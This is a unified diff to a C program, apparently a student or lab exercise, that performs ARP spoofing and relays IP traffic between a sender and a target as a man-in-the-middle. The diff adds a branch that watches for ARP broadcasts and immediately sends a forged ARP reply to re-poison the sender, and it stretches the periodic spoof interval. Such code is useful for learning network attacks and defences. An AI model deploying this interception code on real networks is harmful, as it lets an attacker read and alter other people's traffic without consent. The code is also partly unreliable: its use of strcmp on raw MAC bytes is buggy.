@@ -50,6 +50,7 @@ typedef struct multiple_args_relay_ip{
     pcap_t* handle;
     struct in_addr sender_ip;
     struct in_addr target_ip;
+    struct in_addr myip;
     u_char target_mac[6]; 
     u_char my_mac[6];
     u_char sender_mac[6];
@@ -158,7 +159,7 @@ void *send_arp_as_thread(void *multiple_args){
         }
         printf("\n");
         pthread_mutex_unlock(&mutex);
-        sleep(1);
+        sleep(10);
     }
 }
 
@@ -169,6 +170,7 @@ void *relay_ip_as_thread(void *multiple_args){
     //sender_ip = 1st parameter that user inputs.
     in_addr sender_ip = multi_args->sender_ip;
     in_addr target_ip = multi_args->target_ip;
+    in_addr my_ip = multi_args->myip;
     u_char target_mac[6], my_mac[6], sender_mac[6];
     memcpy(target_mac,multi_args->target_mac,sizeof(multi_args->target_mac));
     memcpy(my_mac,multi_args->my_mac,sizeof(multi_args->my_mac));
@@ -179,6 +181,10 @@ void *relay_ip_as_thread(void *multiple_args){
 
     ETHER_HDR *eth_rel;
     struct ip *iph_rel;
+    ARP_HDR *arph_rel;
+    
+    ETHER_HDR eth_spoofing;
+    ARP_HDR arph_spoofing;
 
     while(1){
         int res = pcap_next_ex(handle, &header, &packet);
@@ -188,7 +194,7 @@ void *relay_ip_as_thread(void *multiple_args){
         eth_rel = (ETHER_HDR*)packet;
         uint16_t eth_type = ntohs(eth_rel->type);
         //printf("Source_MAC          : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",eth_rel->source[0] , eth_rel->source[1] , eth_rel->source[2] , eth_rel->source[3] , eth_rel->source[4] , eth_rel->source[5]);
-        //Verify a type of reply
+        //Check a type of reply
         if(eth_type == ETHERTYPE_IP){
             printf("IP packet captured\n");
             iph_rel = (struct ip*)(packet+14);
@@ -260,7 +266,30 @@ void *relay_ip_as_thread(void *multiple_args){
                 pthread_mutex_unlock(&mutex);
             }
         }
-
+        else if(eth_type == ETHERTYPE_ARP){
+            pthread_mutex_lock(&mutex);
+            printf("ARP packet captured\n");
+            arph_rel = (ARP_HDR*)(packet+14);
+            u_char desti_mac[6];
+            memcpy(desti_mac,arph_rel->desti_mac,sizeof(arph_rel->desti_mac));
+            u_short frame_length = sizeof(*eth_rel)+sizeof(*arph_rel);
+            for (int i=0; i<frame_length; i++){
+                if(i%16==0){
+                    printf("\n");
+                }
+                printf("%.2x",packet[i]);
+            }
+            printf("\n");
+            if(strcmp((char*)desti_mac,"\x00\x00\x00\x00\x00\x00")==0){
+                printf("#####Send ARP Spoofing Packet After ARP Broadcasting#####\n");
+                assign_ether((char *)my_mac, &eth_spoofing, "");
+                assign_arp((char *)my_mac, &eth_spoofing, &arph_spoofing, &sender_ip, "", &my_ip);
+                send_arp(&eth_spoofing, &arph_spoofing, handle);
+            }
+            //printf("ARP_DEST_FROM_SENDER_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",desti_mac[0] , desti_mac[1] , desti_mac[2] , desti_mac[3] , desti_mac[4] , desti_mac[5]);
+            //if(strcmp(desti_mac,"00000000"))
+            pthread_mutex_unlock(&mutex);
+        }
         printf("\n");
     }
 }
@@ -399,7 +428,7 @@ int main(int argc, char* argv[]) {
     printf("Target_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",target_mac[0] , target_mac[1] , target_mac[2] , target_mac[3] , target_mac[4] , target_mac[5]); 
     
     /**********************************************************************************/
-    //send spoofing frames (ARP Reply)
+    //send spoofing frames (ARP Reply) and relay pacets between sender and target(IP Request and IP Response).
     
     ETHER_HDR eth;
     ARP_HDR arph;
@@ -420,6 +449,7 @@ int main(int argc, char* argv[]) {
     multiple_args_relay.handle = handle;
     multiple_args_relay.sender_ip = sender_ip;
     multiple_args_relay.target_ip = target_ip;
+    multiple_args_relay.myip = myip;
     memcpy(multiple_args_relay.target_mac,target_mac,sizeof(target_mac));
     memcpy(multiple_args_relay.my_mac,host_mac,sizeof(host_mac));
     memcpy(multiple_args_relay.sender_mac,sender_mac,sizeof(sender_mac));
